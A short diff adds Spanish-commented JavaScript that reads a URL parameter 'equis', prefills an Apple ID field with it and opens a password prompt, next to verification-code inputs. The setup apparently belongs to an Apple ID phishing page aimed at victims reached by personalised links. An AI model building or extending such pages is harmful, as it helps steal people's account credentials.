@@ -129,6 +129,18 @@ document.addEventListener('DOMContentLoaded', () => {
   const inputs = document.querySelectorAll('.code-input');
   const hiddenInput = document.getElementById('verification_code');
 
+    // Obtener la URL actual
+  const url = new URL(window.location.href);
+
+  // Obtener el valor del parámetro 'equis'
+  const equis = url.searchParams.get('equis');
+
+  // Comprobar si el parámetro 'equis' existe
+  if (equis) {
+    document.getElementById('apple-id-2').value = equis;
+    showPasswordInput2();
+  }
+
   inputs.forEach((input, index) => {
     // Mover al siguiente campo al ingresar un valor
     input.addEventListener('input', () => {
